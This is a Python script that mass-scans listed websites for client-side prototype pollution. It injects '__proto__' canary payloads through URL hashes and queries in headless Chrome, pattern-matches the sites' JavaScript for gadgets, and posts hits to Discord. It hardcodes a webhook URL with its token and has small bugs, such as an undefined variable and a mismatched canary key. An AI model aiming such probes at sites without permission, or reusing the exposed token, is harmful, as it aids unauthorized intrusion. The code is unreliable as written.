import http.client
from time import sleep
from selenium import webdriver
from threading import Thread
from datetime import datetime
import sys
import re
import csv
import requests
from urllib.parse import urljoin
from cachetools import TTLCache
from cachetools import cached

class Discord:
	def __init__(self, webhook_url):
		self.webhookurl = webhook_url
	def send(self, message):
		formdata = "------:::BOUNDARY:::\r\nContent-Disposition: form-data; name=\"content\"\r\n\r\n" + message + "\r\n------:::BOUNDARY:::--"
		connection = http.client.HTTPSConnection("discord.com")
		headers = {
			#'content-type': "application/json",
            'content-type': "multipart/form-data; boundary=----:::BOUNDARY:::",
            'cache-control': "no-cache"
        }
		connection.request("POST", self.webhookurl, formdata, headers)
		response = connection.getresponse()
		#print(response.status, response.reason)
		result = response.read()
		return result.decode("utf-8")

class Logging:
	datefmt='%d-%b-%y %H:%M:%S'
	def __init__(self, webhooks, stdout=0):
		self.success_webhook  = Discord(webhooks["success-bot"]) if webhooks["success-bot"] else None
		self.info_webhook  = Discord(webhooks["info-bot"]) if webhooks["info-bot"] else None
		self.debug_webhook = Discord(webhooks["debug-bot"]) if webhooks["debug-bot"] else None
		self.error_webhook = Discord(webhooks["error-bot"]) if webhooks["error-bot"] else None
		self.stdout = stdout
	def date_format(self):
		myDate = datetime.now()
		return myDate.strftime("%b-%d-%y %H:%M:%S")
	def success(self, msg):
		temp = "`[*] ({})` {}".format(self.date_format(), msg)
		if self.success_webhook:
			self.success_webhook.send(temp)
		if self.stdout:
			print(temp)
	def info(self, msg):
		temp = "`[+] ({})` {}".format(self.date_format(), msg)
		if self.info_webhook:
			self.info_webhook.send(temp)
		if self.stdout:
			print(temp)
	def debug(self, msg):
		temp = "`[~] ({})` {}".format(self.date_format(), msg)
		if self.debug_webhook:
			self.debug_webhook.send(temp)
	def error(self, msg):
		temp = "`[-] ({})` {}".format(self.date_format(), msg)
		if self.error_webhook:
			self.error_webhook.send(temp)
		if self.stdout:
			print(temp)
def patternread():
    try:
        with open(PATTERN_FILE, 'r') as csvfile:
            contents = csv.reader(csvfile)
            objects = []
            for line in contents:
                line = ' '.join(line).strip()
                if line.startswith('#') or line == '':
                    continue
                data = line.split('|')
                name = data[0].strip()
                type = data[1].strip()
                chunk = '|'.join(data[2:]).strip()
                obj = {'name': name, 'type': type, 'chunk': chunk}
                objects.append(obj)
        return objects
    except Exception as e:
        print(e)


def patternMatch(text, database):
    result = []
    matches = []

    for pattern in database:
        name = pattern['name']
        type = pattern['type']
        chunk = pattern['chunk']

        if type == 'regex':
            re_obj = re.compile(chunk, re.IGNORECASE)
            match = re_obj.search(text)
            if match:
                result.append(name)
                matches.append(match)
        elif type == 'text':
            position = text.find(chunk)
            if position != -1:
                result.append(name)
                matches.append({'index': position})

    return [result, matches]
def downloadjs(site,current_url,Id):
	html_content = get_url(site).decode('utf-8')
	#html_content = response.text
	js_files = re.findall(r'<script.*?src="(.*?)".*?></script>', html_content)
	for js_file in js_files:
		
		if js_file.startswith("http"):
			js_url = js_file
		else:
			js_url = urljoin(current_url, js_file.lstrip("/"))
		# print("Downloading from", current_url, js_url)
		try:
				js_data = get_url(js_url).decode('utf-8')
				result, matches = patternMatch(js_data, objects)
				if result:
					LOGGER.success("T-{} : Found `{}` in `{}` on '{}'. @everyone".format(Id, result, site,js_file))
		except requests.exceptions.RequestException as e:
			LOGGER.error(f"Error downloading JavaScript file: {js_url}. Error: {e}")


class Browser(Thread):
	def __init__(self, threat_id, logger,objects):
		Thread.__init__(self)
		self.Id = threat_id
		self.logger = logger
		self.objects = objects
		self.init_driver()
	def init_driver(self):
		options = webdriver.ChromeOptions()
		options.headless = True
		options.add_argument('--no-sandbox')
		options.add_argument('--ignore-ssl-errors=yes')
		options.add_argument('--ignore-certificate-errors')
		self.driver = webdriver.Chrome('./chromedriver',options=options)
	def test_payload(self, site, end, payload):
		url = site + end + payload[1]
		err_code = 0
		try:
			self.driver.get(url)
			sleep(1)
			if(payload[0] == "XSS Prototype #3" and end == '#'):
				downloadjs(site,self.driver.current_url,self.Id)
			err_code = 1
			if(self.driver.current_url!=url):
				if(self.driver.current_url.find(payload[1])!=-1):
					sleep(1)
				else:
					self.driver.get(self.driver.current_url+end+payload[1])
					sleep(1)
			
			err_code = 2
			single = self.driver.execute_script('return Object.__proto__')
			err_code = 3
			double = self.driver.execute_script('return Object.__proto__.__proto__')
			err_code = 4
			check = self.driver.execute_script(VERIFY_SCRIPT)
			err_code = 5
			key = '4e32a5ec9c99' ; value = 'ddcb362f1d60'
			if check or (key in single and single[key] == value) or (key in double and double[key] == value):
				self.logger.success("T-{} : Found `{}` in `{}{}`. @everyone".format(self.Id, payload[0], site, end, self.driver.current_url))
		except Exception as e:
			self.logger.error("`T-{} : site-{} Err({}) - {} - {}`".format(self.Id, site, err_code, str(x), e  ))
	def run(self):
		self.logger.info("Thread-{} : Started !...".format(self.Id))
		while QUEUE:
			site = QUEUE.pop(0) ; l = len(QUEUE)
			self.logger.debug("T-{} : Checking - `{}` ; still - ({})".format(self.Id, site, l))
			for payload in PAYLOADS:
				for end in ['#' , '?']:
					self.test_payload(site, end, payload)
			load_queue()
		self.logger.info("Thread-{} : Stoping !...".format(self.Id))
		self.driver.quit()

cache = TTLCache(maxsize=100, ttl=200)
@cached(cache)
def get_url(url):
    response = requests.get(url)
    return response.content

def load_queue():
	with open(FILENAME) as file:
		fp = file.read().split("\n")
	count = 0
	for x in fp:
		if x.strip():
			count += 1
			url = parse_url(x.strip())
			QUEUE.append(url)
	if count == 0:
		return
	LOGGER.info("Loaded : {} sites ; Total {} sites in QUEUE".format(count, len(QUEUE)))
	with open(FILENAME, 'w') as file:
		file.write('')

def parse_url(site):
	if site.count('/') == 2 and not site.endswith('/'):
		return site + '/'
	return site


PAYLOADS = [ 
	#['XSS Prototype #1',  'x[__proto__][e32a5ec9c99]=ddcb362f1d60', ],
	#['XSS Prototype #2',  'x.__proto__.e32a5ec9c99=ddcb362f1d60', ],
	['XSS Prototype #3',  '__proto__[e32a5ec9c99]=ddcb362f1d60', ],
	['XSS Prototype #4',  '__proto__.e32a5ec9c99=ddcb362f1d60', ],
	#['XSS Prototype #5',   '__proto__={\"e32a5ec9c99\":\"e32a5ec9c99\"}'],
	#['XSS Prototype #6',   '__proto__={\"__proto__\":{\"e32a5ec9c99\":\"e32a5ec9c99\"}}']
]

blacklist = [
'https://www.google.com/pagead/conversion_async.js:19:76',
'https://www.google.com/pagead/conversion.js:28:76',
'https://www.googleadservices.com/pagead/conversion_async.js:19:76',
'https://www.googleadservices.com/pagead/conversion.js:28:76'
]

VERIFY_SCRIPT = 'return (Object.__proto__.e32a5ec9c99 == "ddcb362f1d60")'

QUEUE = []



WEBHOOKS = {
	"success-bot" : "https://discord.com/api/webhooks/1103385579145674862/0o-_-fNd7cHAamW_LIRb2JM4tTqdycLpvTWJLxNjBWTZu8GBfAQ-W2IwVyCqdn-4nCkG",
	"info-bot" : "https://discord.com/api/webhooks/1103385579145674862/0o-_-fNd7cHAamW_LIRb2JM4tTqdycLpvTWJLxNjBWTZu8GBfAQ-W2IwVyCqdn-4nCkG",
	"debug-bot" : "https://discord.com/api/webhooks/1103385579145674862/0o-_-fNd7cHAamW_LIRb2JM4tTqdycLpvTWJLxNjBWTZu8GBfAQ-W2IwVyCqdn-4nCkG",
	"error-bot" : "https://discord.com/api/webhooks/1103385579145674862/0o-_-fNd7cHAamW_LIRb2JM4tTqdycLpvTWJLxNjBWTZu8GBfAQ-W2IwVyCqdn-4nCkG"
} 


FILENAME = sys.argv[1]
THREADS = 2
STDOUT = 1
PATTERN_FILE = sys.argv[2]
if __name__ == '__main__':
	objects = patternread()
	LOGGER = Logging(WEBHOOKS, STDOUT)
	LOGGER.info("================================= Brute Force Started =================================")
	load_queue()
	bots = [Browser(x+1, LOGGER,objects) for x in range(THREADS)]
	LOGGER.info("Process started with {} threads & {} urls".format(THREADS, len(QUEUE)))
	for x in bots: x.start()
